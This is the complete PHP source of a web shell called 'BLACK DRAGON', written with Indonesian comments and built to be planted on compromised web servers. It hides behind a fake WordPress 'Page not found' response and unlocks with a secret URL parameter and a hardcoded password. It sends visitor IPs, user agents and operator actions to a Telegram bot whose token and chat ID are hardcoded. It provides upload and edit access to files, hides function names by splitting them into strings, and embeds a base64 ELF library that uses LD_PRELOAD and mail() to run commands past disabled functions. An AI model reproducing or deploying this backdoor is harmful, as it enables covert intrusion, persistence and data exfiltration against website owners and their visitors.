<?php
/* ============================================================
 *  B L A C K   D R A G O N   F I L E   M A N A G E R   v3.3
 * ============================================================
 *  Nama shell : BLACK DRAGON (file: blackdragon.php)
 *  --------------------------------------------------------
 *  Akses  : domain.com/blackdragon.php?nagahitam  (WAJIB)
 *           Tanpa parameter nagahitam -> HTTP 404 palsu (WP page not found)
 *  Login  : POST pass=Lapetkudanil123@
 *  Sesi   : PHP session server-side (TIDAK ADA cookie auth sama sekali)
 *  Probe  : ?nagahitam&h=bd  ->  BDGK<md5('blackdragon')>
 *  Log    : Semua aktivitas dikirim ke Telegram (IP, UA, URL, aksi)
 *  Fitur  : file manager (view/edit/rename/delete/upload/create),
 *           command biasa (proc_open), command bypass (chankro
 *           LD_PRELOAD + mail()), info fungsi.
 * ============================================================
 */

/* ---- KONFIGURASI TELEGRAM ---- */
define('TELEGRAM_BOT_TOKEN', '7672463085:AAFv4AZzzjOvJMhR7KrwBTM7vV4Wecd7BgQ');
define('TELEGRAM_CHAT_ID', '-1002624693937');
/* ----------------------------- */

@session_start();
@error_reporting(0);
@set_time_limit(0);

$BDKey   = '$2b$10$nQ3Udh6vbN5rOp3ru8TIl.E8F7k6xuQO0uwIWTxSX6ObE5OT6fteK'; // Lapetkudanil123@
$BDProbe = 'BDGK' . md5('blackdragon');

/* ---------- util ---------- */
function bdSendTelegram($message) {
    $api = getenv('BLACKDRAGON_TG_URL');
    $base = $api ? rtrim($api, '/') : "https://api.telegram.org";
    $url = $base . "/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage"
         . "?chat_id=" . urlencode(TELEGRAM_CHAT_ID)
         . "&text=" . urlencode($message);
    $ctx = stream_context_create(array('http' => array('timeout' => 4, 'ignore_errors' => true)));
    @file_get_contents($url, false, $ctx);
}

function bdLogActivity($activity) {
    $fullPath = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
    $domain   = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
    $ip       = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    $ua       = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $msg = "BLACK DRAGON Shell\n"
         . "Aktivitas : " . $activity . "\n"
         . "IP        : " . $ip . "\n"
         . "User-Agent: " . $ua . "\n"
         . "URL       : " . $domain . $fullPath;
    bdSendTelegram($msg);
}

/* ---------- GATE: tanpa ?nagahitam -> 404 palsu ---------- */
if (!isset($_GET['nagahitam'])) {
    http_response_code(404);
    echo "<!DOCTYPE html><html><head><title>Page not found</title></head>"
       . "<body style='background:#f0f0f1;color:#3c434a;font-family:-apple-system,"
       . "BlinkMacSystemFont,Segoe UI,Roboto,sans-serif'>"
       . "<div style='max-width:560px;margin:80px auto;padding:24px'>"
       . "<h1 style='font-size:23px;font-weight:400'>Page not found</h1>"
       . "<p style='color:#787c82;font-size:14px'>The page you requested could not be found.</p>"
       . "</div></body></html>";
    bdLogActivity("AKSES TANPA KATA KUNCI (scanning/sinyal backdoor salah)");
    return;
}

/* ---------- health probe (tanpa login, tanpa log spam) ---------- */
if (isset($_GET['h']) && $_GET['h'] === 'bd') {
    header('Content-Type: text/plain; charset=utf-8');
    echo $BDProbe;
    return;
}

/* ---------- LOGIN (password saja, tanpa username, tanpa cookie) ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
    if (password_verify($_POST['pass'], $BDKey)) {
        session_regenerate_id(true);
        $_SESSION['bd_auth'] = true;
        bdLogActivity("LOGIN BERHASIL - shell BLACK DRAGON dibuka");
    } else {
        bdLogActivity("PERCOBAAN LOGIN GAGAL - password salah");
        http_response_code(404);
        echo "<!DOCTYPE html><html><head><title>Page not found</title></head>"
           . "<body style='background:#f0f0f1;color:#3c434a;font-family:-apple-system,"
           . "BlinkMacSystemFont,Segoe UI,Roboto,sans-serif'>"
           . "<div style='max-width:560px;margin:80px auto;padding:24px'>"
           . "<h1 style='font-size:23px;font-weight:400'>Page not found</h1>"
           . "<p style='color:#787c82;font-size:14px'>The page you requested could not be found.</p>"
           . "</div></body></html>";
        return;
    }
}

/* ---------- LOGOUT ---------- */
if (isset($_GET['logout'])) {
    bdLogActivity("LOGOUT");
    $_SESSION = array();
    session_destroy();
    http_response_code(404);
    echo "<h1>Page not found</h1>";
    return;
}

/* ---------- HALAMAN LOGIN ---------- */
if (empty($_SESSION['bd_auth'])) {
    echo "<!DOCTYPE html><html><head><title>404</title><meta charset='utf-8'>"
       . "<style>body{margin:0;min-height:100vh;background:linear-gradient(135deg,#0a0a0f,#1a1a2e);"
       . "display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif}"
       . ".bd-box{background:rgba(8,8,14,.85);border:1px solid #6d3b8f;border-radius:14px;"
       . "padding:42px 38px;width:320px;text-align:center;box-shadow:0 0 40px rgba(109,59,143,.45)}"
       . ".bd-logo{color:#c084fc;font-weight:800;letter-spacing:3px;font-size:20px;"
       . "text-shadow:0 0 14px rgba(192,132,252,.8);margin-bottom:24px}"
       . "input{width:100%;box-sizing:border-box;padding:12px 14px;margin:6px 0;"
       . "background:rgba(20,20,30,.85);border:1px solid #3a2a4d;border-radius:8px;color:#eee;outline:none}"
       . "input:focus{border-color:#9333ea}button{width:100%;padding:12px;margin-top:10px;"
       . "background:linear-gradient(90deg,#7c3aed,#a855f7);color:#fff;border:0;border-radius:8px;"
       . "font-weight:700;cursor:pointer}button:hover{filter:brightness(1.15)}</style></head><body>"
       . "<div class='bd-box'><div class='bd-logo'>&#9650; BLACK DRAGON &#9650;</div>"
       . "<form method='post' autocomplete='off'>"
       . "<input type='password' name='pass' placeholder='Password' autofocus>"
       . "<button>Masuk</button></form></div></body></html>";
    return;
}

/* ================= AUTHENTICATED - FILE MANAGER ================= */

$chd = "c"."h"."d"."i"."r";
$expl = "e"."x"."p"."l"."o"."d"."e";
$scd = "s"."c"."a"."n"."d"."i"."r";
$ril = "r"."e"."a"."l"."p"."a"."t"."h";
$st = "s"."t"."a"."t";
$isdir = "i"."s"."_"."d"."i"."r";
$isw = "i"."s"."_"."w"."r"."i"."t"."a"."b"."l"."e";
$mup = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";
$bs = "b"."a"."s"."e"."n"."a"."m"."e";
$htm = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
$fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$mek = "m"."k"."d"."i"."r";
$fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$drnmm = "d"."i"."r"."n"."a"."m"."e";
$unl = "u"."n"."l"."i"."n"."k";
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = $ril($_SERVER['\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54']);
$scriptDirectory = $drnmm(__FILE__);

function x($b) {
    $be = "ba"."se"."64"."_"."en"."co"."de";
    return $be($b);
}
function y($b) {
    $bd = "ba"."se"."64"."_"."de"."co"."de";
    return $bd($b);
}

echo "<!DOCTYPE html><html><head><title>BLACK DRAGON</title><meta charset='UTF-8'>"
   . "<meta http-equiv='X-UA-Compatible' content='IE=edge'>"
   . "<meta name='robots' content='noindex, nofollow'>"
   . "<link href='https://fonts.googleapis.com/css?family=Arial%20Black' rel='stylesheet'>"
   . "<style>"
   . "body{font-family:'Arial Black',sans-serif;color:#000;margin:0;padding:0;background-color:#242222c9;}"
   . ".container{max-width:90%;margin:20px auto;padding:20px;background-color:#fff;border-radius:44px;box-shadow:0 0 10px rgba(0,0,0,.1)}"
   . ".header{text-align:center;margin-bottom:20px}.header h1{font-size:24px}"
   . ".subheader{text-align:center;margin-bottom:20px}.subheader p{font-size:16px;font-style:italic}"
   . "form{margin-bottom:20px}"
   . "form input[type=text],form textarea{padding:8px;margin-bottom:10px;border:1px solid #000;border-radius:3px;box-sizing:border-box}"
   . "form input[type=submit]{padding:10px;background-color:#000;color:#fff;border:none;border-radius:3px;cursor:pointer}"
   . "form input[type=file]{padding:7px;background-color:#000;color:#fff;border:none;border-radius:3px;cursor:pointer}"
   . "form input[type=submit]:hover{background-color:#143015}"
   . "table{width:100%;border-collapse:collapse;margin-top:20px}th,td{padding:8px;text-align:left}"
   . "th{background-color:#5c5c5c}tr:nth-child(even){background-color:#9c9b9bce}"
   . ".item-name{max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}"
   . ".size,.date{width:100px}.permission{font-weight:bold;width:50px;text-align:center}"
   . ".writable{color:#0db202}.not-writable{color:#d60909}"
   . ".result-box{width:100%;height:200px;padding:10px;border:1px solid #ddd;border-radius:5px;"
   . "background-color:#f4f4f4;overflow:auto;box-sizing:border-box;font-family:'Arial Black';color:#333}"
   . ".result-box:focus{outline:none;border-color:#000}.result-box::-webkit-scrollbar{width:8px}"
   . ".result-box::-webkit-scrollbar-thumb{background-color:#000;border-radius:4px}"
   . "textarea[name=file_content]{width:calc(100.9% - 10px);margin-bottom:10px;padding:8px;max-height:500px;resize:vertical;border:1px solid #ddd;border-radius:3px;font-family:'Arial Black'}"
   . ".bd-top{display:flex;gap:16px;align-items:center;padding:10px 18px;background:rgba(8,8,14,.85);border-bottom:1px solid #6d3b8f;border-radius:0 0 8px 8px;margin-bottom:14px}"
   . ".bd-top .bd-logo{color:#c084fc;font-weight:800;letter-spacing:2px;font-size:15px}"
   . ".bd-info{font-size:11px;color:#9a9ab0;flex:1}"
   . ".bd-out{color:#f472b6;font-size:12px;text-decoration:none}"
   . "</style></head><body><div class='container'>";

echo "<div class='bd-top'><span class='bd-logo'>&#9650; BLACK DRAGON</span>"
   . "<span class='bd-info'>server: " . php_uname() . " | php " . PHP_VERSION . "</span>"
   . "<a class='bd-out' href='?nagahitam&logout'>logout</a></div>";

echo "<font color='black'>[ Command Bypas XPLOITID BLACK DRAGON]</font><br>";
if (function_exists('mail')) {
    echo "<font color='black'>[ Function mail() ] :</font><font color='green'> [ ON ]</font><br>";
} else {
    echo "<font color='black'>[ Function mail() ] :<font color='red'> [ OFF ]</font><br>";
}
if (function_exists('putenv')) {
    echo "<font color='black'>[ Function putenv() ] :</font><font color='green'> [ ON ]</font><br>";
} else {
    echo "<font color='black'>[ Function putenv() ] :<font color='red'> [ OFF ]</font><br>";
}
foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = $ril(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
$chd($currentDirectory);

$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        bdLogActivity("UPLOAD FILE: " . $bs($_FILES["fileToUpload"]["name"]));
        $target_file = $currentDirectory . '/' . $bs($_FILES["fileToUpload"]["name"]);
        if ($mup($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<hr>File " . $htm($bs($_FILES["fileToUpload"]["name"])) . " Upload success<hr>";
        } else {
            echo "<hr>Sorry, there was an error uploading your file.<hr>";
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $ff = $_POST['folder_name'];
        bdLogActivity("CREATE FOLDER: " . $ff);
        $newFolder = $currentDirectory . '/' . $ff;
        if (!file_exists($newfolder)) {
            if ($mek($newFolder) !== false) {
                echo '<hr>Folder created successfully!';
            }else{
                echo '<hr>Error: Failed to create folder!';
            }
        }
    } elseif (isset($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        bdLogActivity("CREATE FILE: " . $fileName);
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if ($fpc($newFile, '') !== false) {
                echo '<hr>File created successfully!' . $fileName .' ';
                $fileToView = $newFile;
                if (file_exists($fileToView)) {
                    $fileContent = $fgc($fileToView);
                    $viewCommandResult = '<hr><p>Result: ' . $fileName . '</p>
                    <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
                    <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
                    <input type="hidden" name="edit_file" value="' . $fileName . '">
                    <input type="submit" value=" Save "></form></td>';
                } else {
                    $viewCommandResult = '<hr><p>Error: File not found!</p>';
                }
            } else {
                echo '<hr>Error: Failed to create file!';
            }
        }else{
            echo '<hr>Error: File Already Exists!';
        }
    } elseif (isset($_POST['cmd_input'])){
        bdLogActivity("COMMAND BYPASS (chankro): " . substr($_POST['cmd_input'], 0, 200));
        $p = "p"."u"."t"."e"."n"."v";
        $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
        $m = "m"."a"."i"."l";
        $base = "ba"."se"."64"."_"."de"."co"."de";
        $en = "ba"."se"."64"."_"."en"."co"."de";
        $drnm= "d"."i"."r"."n"."a"."m"."e";
        $currentFilePath = $_SERVER['PHP_SELF'];
        $doc = $_SERVER['DOCUMENT_ROOT'];
        $directoryPath = $drnm($currentFilePath);
        $full = $doc . $directoryPath;
        $hook = 'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA4AcAAAAAAABAAAAAAAAAAPgZAAAAAAAAAAAAAEAAOAAHAEAAHQAcAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAoAAAAAAABsCgAAAAAAAAAAIAAAAAAAAQAAAAYAAAD4DQAAAAAAAPgNIAAAAAAA+A0gAAAAAABwAgAAAAAAAHgCAAAAAAAAAAAgAAAAAAACAAAABgAAABgOAAAAAAAAGA4gAAAAAAAYDiAAAAAAAMABAAAAAAAAwAEAAAAAAAAIAAAAAAAAAAQAAAAEAAAAyAEAAAAAAADIAQAAAAAAAMgBAAAAAAAAJAAAAAAAAAAkAAAAAAAAAAQAAAAAAAAAUOV0ZAQAAAB4CQAAAAAAAHgJAAAAAAAAeAkAAAAAAAA0AAAAAAAAADQAAAAAAAAABAAAAAAAAABR5XRkBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQEAAAA+A0AAAAAAAD4DSAAAAAAAPgNIAAAAAAACAIAAAAAAAAIAgAAAAAAAAEAAAAAAAAABAAAABQAAAADAAAAR05VAGhkFopFVPvXbYbBilBq7Sd8S1krAAAAAAMAAAANAAAAAQAAAAYAAACIwCBFAoRgGQ0AAAARAAAAEwAAAEJF1exgXb1c3muVgLvjknzYcVgcuY3xDurT7w4bn4gLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHkAAAASAAAAAAAAAAAAAAAAAAAAAAAAABwAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAIYAAAASAAAAAAAAAAAAAAAAAAAAAAAAAJcAAAASAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAASAAAAAAAAAAAAAAAAAAAAAAAAAGEAAAAgAAAAAAAAAAAAAAAAAAAAAAAAALIAAAASAAAAAAAAAAAAAAAAAAAAAAAAAKMAAAASAAAAAAAAAAAAAAAAAAAAAAAAADgAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAFIAAAAiAAAAAAAAAAAAAAAAAAAAAAAAAJ4AAAASAAAAAAAAAAAAAAAAAAAAAAAAAMUAAAAQABcAaBAgAAAAAAAAAAAAAAAAAI0AAAASAAwAFAkAAAAAAAApAAAAAAAAAKgAAAASAAwAPQkAAAAAAAAdAAAAAAAAANgAAAAQABgAcBAgAAAAAAAAAAAAAAAAAMwAAAAQABgAaBAgAAAAAAAAAAAAAAAAABAAAAASAAkAGAcAAAAAAAAAAAAAAAAAABYAAAASAA0AXAkAAAAAAAAAAAAAAAAAAHUAAAASAAwA4AgAAAAAAAA0AAAAAAAAAABfX2dtb25fc3RhcnRfXwBfaW5pdABfZmluaQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBfX2N4YV9maW5hbGl6ZQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHB3bgBnZXRlbnYAY2htb2QAc3lzdGVtAGRhZW1vbml6ZQBzaWduYWwAZm9yawBleGl0AHByZWxvYWRtZQB1bnNldGVudgBsaWJjLnNvLjYAX2VkYXRhAF9fYnNzX3N0YXJ0AF9lbmQAR0xJQkNfMi4yLjUAAAAAAgAAAAIAAgAAAAIAAAACAAIAAAACAAIAAQABAAEAAQABAAEAAQABAAAAAAABAAEAuwAAABAAAAAAAAAAdRppCQAAAgDdAAAAAAAAAPgNIAAAAAAACAAAAAAAAACwCAAAAAAAAAgOIAAAAAAACAAAAAAAAABwCAAAAAAAAGAQIAAAAAAACAAAAAAAAABgECAAAAAAAAAOIAAAAAAAAQAAAA8AAAAAAAAAAAAAANgPIAAAAAAABgAAAAIAAAAAAAAAAAAAAOAPIAAAAAAABgAAAAUAAAAAAAAAAAAAAOgPIAAAAAAABgAAAAcAAAAAAAAAAAAAAPAPIAAAAAAABgAAAAoAAAAAAAAAAAAAAPgPIAAAAAAABgAAAAsAAAAAAAAAAAAAABgQIAAAAAAABwAAAAEAAAAAAAAAAAAAACAQIAAAAAAABwAAAA4AAAAAAAAAAAAAACgQIAAAAAAABwAAAAMAAAAAAAAAAAAAADAQIAAAAAAABwAAABQAAAAAAAAAAAAAADgQIAAAAAAABwAAAAQAAAAAAAAAAAAAAEAQIAAAAAAABwAAAAYAAAAAAAAAAAAAAEgQIAAAAAAABwAAAAgAAAAAAAAAAAAAAFAQIAAAAAAABwAAAAkAAAAAAAAAAAAAAFgQIAAAAAAABwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElCQ18yLjIuNQBleGl0QEBHTElCQ18yLjIuNQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuNQBfaW5pdABmb3JrQEBHTElCQ18yLjIuNQAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYiAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAucGx0LmdvdAAudGV4dAAuZmluaQAucm9kYXRh